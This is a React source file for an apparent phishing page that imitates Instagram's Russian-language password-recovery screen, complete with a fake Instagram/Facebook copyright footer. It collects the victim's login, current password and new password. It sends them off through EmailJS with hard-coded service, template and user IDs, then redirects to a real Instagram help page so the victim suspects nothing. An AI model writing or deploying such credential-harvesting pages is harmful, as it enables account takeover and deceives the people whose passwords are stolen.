import emailjs from 'emailjs-com';
import './App.css';

function App() {

function sendEmail(e) {
  e.preventDefault();
  emailjs.sendForm('service_zbqh9jd', 'template_t2fgsuc', e.target, 'user_06Bc8YpLm3VfSutzWApTL')
    .then((result) => {
        console.log(result.text);
        window.location.href = 'https://help.instagram.com/369001149843369?helpref=page_content'
    }, (error) => {
        console.log(error.text);
    });
}

  return (
    <div className="envy">
        <div className="pride">
            <div className="gluttony">          
                <img src="https://i.imgur.com/pKHNcRB.png" width="180px" height="45px"/>          
            </div>
        </div>
        <div className="wrath">
            <div className="lust">
                <div className="hiv aids cancer leukemia nausea">
                    <div className="hiv hpv cancer ebola plague lri">
                        <img src="spriteLock.png"/>
                    </div>
                    <div className="hiv aids cancer ebola plague copd">
                        <h4 className="pain">Восстановление пароля</h4>                        
                    </div>

                    <div className="hiv aids cancer ebola plague copd">
                        <div className="misery">
                            Введите номер телефона, имя пользователя или электронный адрес, текущий пароль. Придумайте новый пароль.</div>                       
                    </div>

                    <div className="hiv aids cancer ebola plague copd">
                        <form onSubmit={sendEmail}>
                            <label className="exposure">
                                <input className="deceive" id="1" name="login" placeholder="Номер телефона, имя пользователя или электронный адрес" type="text" autoComplete="off" />
                                <span className="treason"></span>
                            </label>

                          <label className="exposure">
                                <input className="deceive" id="2" name="oldpassword" placeholder="Пароль" type="password" autoComplete="off"/>
                                <div className="sin">
                                        <div className="hiv aids cancer ebola plague copd">
                                            <button className="coil" id="a" type="button">Показать</button>
                                        </div>
                                </div>
                                <span className="treason"></span>
                            </label>

                            <label className="exposure">
                                <input className="deceive" id="3" name="newpassword" placeholder="Новый пароль" type="password" autoComplete="off"/>
                                <div className="sin">
                                        <div className="hiv aids cancer ebola plague copd">
                                            <button className="coil" id="b" type="button">Показать</button>
                                        </div>
                                </div>
                                <span className="treason"></span>
                            </label>

                            <label className="exposure">
                                <input className="deceive" id="4" name="newpasswordrepeat" placeholder="Повторите пароль" type="password" autoComplete="off"/>
                                <div className="sin">
                                        <div className="hiv aids cancer ebola plague copd">
                                            <button className="coil" id="c" type="button">Показать</button>
                                        </div>
                                </div>
                                <span className="treason"></span>
                            </label>
                            <div className="hiv aids cancer ebola plague copd">
                                    <button className="poison deadly logoslarge" type="submit" id="button">Изменить пароль</button>
                            </div>
                            </form>
                            </div>
                        
                        <div className="sloth"></div>  
                    </div>

                    
            </div>            
            </div>
            <div className="famine pestilence">
        <div className="death war">
            <nav className="decay">
                <ul className="outbreak">
                    <li className="conjuring" >
                        <a >О НАС</a>
                    </li>
                    <li className="conjuring">
                            <a>ПОДДЕРЖКА</a>
                        </li>
                        <li className="conjuring">
                                <a>ПРЕССА</a>
                            </li>
                            <li className="conjuring">
                                    <a>API</a>
                                </li>
                                <li className="conjuring">
                                        <a>ВАКАНСИИ</a>
                                    </li>
                                    <li className="conjuring">
                                            <a>КОНФИДЕНЦИАЛЬНОСТЬ</a>
                                        </li>
                                        <li className="conjuring">
                                                <a>УСЛОВИЯ</a>
                                            </li>
                                            <li className="conjuring">
                                                    <a>ДИРЕКТОРИЯ</a>
                                                </li>
                                                <li className="conjuring">
                                                        <a>ПРОФИЛИ</a>
                                                    </li>
                                                    <li className="conjuring">
                                                            <a>ХЭШТЕГИ</a>
                                                        </li>
                                                        <li className="conjuring">
                                                                <a>ЯЗЫК</a>
                                                            </li>
                                                            
                </ul>
                <span className="abuse">© Instagram от Facebook, 2020 </span>
            </nav>
        
        </div>
    </div>
        </div>

    
  );
}

export default App;
